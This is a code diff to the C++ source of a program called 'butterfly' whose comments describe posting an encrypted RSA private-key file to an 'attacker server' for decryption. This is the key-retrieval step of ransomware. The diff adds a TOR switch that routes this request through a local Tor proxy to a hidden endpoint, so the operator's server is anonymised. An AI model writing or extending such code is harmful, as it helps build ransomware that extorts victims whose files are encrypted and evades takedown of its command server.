@@ -1,6 +1,8 @@
 
 #include "butterfly.h"
 
+#define TOR 1
+
 namespace butterfly
 {
 
@@ -182,9 +184,17 @@ void Butterfly::run()
 
         // Connection check whether internet is available for the POST request to the attacker server or not
         checkInternetConnection();
+        std::unique_ptr<butterfly::HTTPClient> httpClient;
+        if (TOR)
+        {
+            // HTTPClient to send post request over the tor network to decrypt the CPrivateRSA.bin file
+            httpClient = std::unique_ptr<butterfly::HTTPClient>(new butterfly::HTTPClient("127.0.0.1", 9050));
+        } else
+        {
+            // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
+            httpClient = std::unique_ptr<butterfly::HTTPClient>(new butterfly::HTTPClient());
+        }
 
-        // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
-        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient());
 
         // Create the correct formParam string with mandatory param:value pairs
         _formParamVec.insert(_formParamVec.end(), {std::make_pair(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex),
@@ -192,8 +202,16 @@ void Butterfly::run()
                                                              std::make_pair("RSAKeySize", std::to_string(butterfly::params::RSA_KEYSIZE))});
         std::string formParamStr = butterfly::createFormParamStr(_formParamVec);
 
+        std::string decryptedCPrivateRSAStr;
         // Send the http post request to the REMOTE_DECRYPTION_URL
-        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
+        if (TOR)
+        {
+            decryptedCPrivateRSAStr = httpClient->postTor(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL_TOR, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT_TOR);
+        } else
+        {
+            decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
+        }
+
 
         if ( httpClient->statusCode == 200 )
         {
